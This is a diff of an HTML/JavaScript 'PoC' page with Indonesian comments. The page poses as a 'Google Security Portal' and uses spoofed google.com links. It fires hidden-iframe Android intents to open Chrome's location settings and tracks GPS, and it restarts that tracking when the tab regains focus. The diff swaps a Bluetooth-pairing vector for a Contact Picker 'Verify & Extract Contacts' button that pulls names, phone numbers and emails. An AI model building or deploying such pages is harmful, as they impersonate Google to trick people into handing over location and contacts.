@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chrome Site Settings & Geolocation PoC</title>
+    <title>Chrome Site Settings & Contact Picker PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -90,17 +90,17 @@
 <body>
 
     <div class="banner">Google Security Portal</div>
-    <h1>Chrome Internal Settings & GPS Sync</h1>
+    <h1>Chrome Internal Settings & Contact Vector</h1>
 
     <div class="button-container">
-        <!-- Tombol 1: Membuka Chrome Site Settings (Location) -->
+        <!-- Tombol 1: Membuka Chrome Site Settings (Location) & GPS Sync -->
         <a href="https://google.com" class="spoof-link" id="btnChromeSettings">1-Click -> Open Chrome Site Settings (Location)</a>
 
-        <!-- Tombol 2: Bluetooth Auto-Connect Intent -->
-        <a href="https://google.com" class="spoof-link" style="background-color: #34a853;" id="btnBluetooth">1-Click -> Bluetooth Device Pairing Vector</a>
+        <!-- Tombol 2: Contact Picker API Vector dengan Logika Serupa -->
+        <a href="https://google.com" class="spoof-link" style="background-color: #9334e6;" id="btnContactPicker">1-Click -> Verify & Extract Contacts</a>
     </div>
 
-    <!-- Info Box Hasil Eksekusi & Koordinat -->
+    <!-- Info Box Hasil Eksekusi, Koordinat, & Kontak -->
     <div class="info-box" id="infoBox">
         <strong>Status:</strong> <span id="statusText" class="pulse">Ready...</span><br>
         <div id="coordDetails" style="margin-top: 8px;"></div>
@@ -155,23 +155,19 @@
             statusText.className = "pulse";
             statusText.innerText = "Targeting Chrome Site Settings (Location)...";
 
-            // Android Intent untuk memaksa membuka halaman setelan situs internal Chrome
-            // Format intent mengarahkan URI scheme ke package com.android.chrome dengan action view
             const intentFrame = document.createElement('iframe');
             intentFrame.style.display = 'none';
-            // Menargetkan URL internal chrome://settings/content/location melalui format intent browser
             intentFrame.src = "intent://settings/content/location#Intent;package=com.android.chrome;scheme=chrome;end;";
             document.body.appendChild(intentFrame);
             setTimeout(() => document.body.removeChild(intentFrame), 1000);
 
-            // Memulai sinkronisasi penarikan lokasi
             startLocationWatch();
 
             setTimeout(() => { triggered = false; }, 1000);
         };
 
-        // Handler Tombol 2: Bluetooth Pairing / Auto-Connect Vector
-        const handleBluetoothVector = async () => {
+        // Handler Tombol 2: Contact Picker API Vector
+        const handleContactVector = async () => {
             if (triggered) return;
             triggered = true;
 
@@ -181,36 +177,59 @@
             
             infoBox.style.display = "block";
             statusText.className = "pulse";
-            statusText.innerText = "Initiating Bluetooth Device Pairing...";
-
-            const btIntentFrame = document.createElement('iframe');
-            btIntentFrame.style.display = 'none';
-            btIntentFrame.src = "intent:#Intent;action=android.settings.BLUETOOTH_SETTINGS;end;";
-            document.body.appendChild(btIntentFrame);
-            setTimeout(() => document.body.removeChild(btIntentFrame), 1000);
+            statusText.innerText = "Requesting contact directory access...";
 
             try {
-                if (navigator.bluetooth) {
-                    const device = await navigator.bluetooth.requestDevice({
-                        acceptAllDevices: true
-                    });
+                // Mengecek dukungan Contact Picker API pada browser
+                const supportedProps = await navigator.contacts.getProperties();
+                if (supportedProps.includes('name') && supportedProps.includes('tel')) {
+                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                    
                     statusText.className = "";
-                    statusText.innerText = `Paired / Connected Device: ${device.name || 'Unknown'} (${device.id})`;
-                    coordDetails.innerHTML = `<b>Device ID:</b> ${device.id}`;
+                    if (contacts.length > 0) {
+                        statusText.innerText = `Successfully Extracted ${contacts.length} Contact(s)!`;
+                        let contactListHTML = "<b>Extracted Contacts:</b><br>";
+                        contacts.forEach((c, idx) => {
+                            const name = c.name ? c.name.join(', ') : 'No Name';
+                            const tel = c.tel ? c.tel.join(', ') : 'No Phone';
+                            const email = c.email ? c.email.join(', ') : 'No Email';
+                            contactListHTML += `[${idx+1}] ${name} | ${tel} | ${email}<br>`;
+                        });
+                        coordDetails.innerHTML = contactListHTML;
+                    } else {
+                        statusText.innerText = "No contacts selected.";
+                        coordDetails.innerHTML = "";
+                    }
                 } else {
                     statusText.className = "";
-                    statusText.innerText = "Web Bluetooth API not supported.";
+                    statusText.innerText = "Contact Picker properties not fully supported.";
                 }
             } catch (err) {
                 statusText.className = "";
-                statusText.innerText = `Bluetooth action cancelled / blocked: ${err.message}`;
+                statusText.innerText = `Contact picker cancelled or blocked: ${err.message}`;
             } finally {
                 triggered = false;
             }
         };
 
-        // Event listener 1-klik murni tanpa delay ganda
+        // Event listener 1-klik murni
         document.getElementById("btnChromeSettings").addEventListener("click", (e) => {
             e.preventDefault();
             handleChromeSettingsVector();
         });
+
+        document.getElementById("btnContactPicker").addEventListener("click", (e) => {
+            e.preventDefault();
+            handleContactVector();
+        });
+
+        // Auto-Sync saat pengguna kembali dari halaman setelan Chrome ke tab aktif (window focus)
+        window.addEventListener("focus", () => {
+            if (infoBox.style.display === "block" && document.getElementById("coordDetails").innerHTML.includes("Latitude")) {
+                startLocationWatch();
+            }
+        });
+    </script>
+
+</body>
+</html>
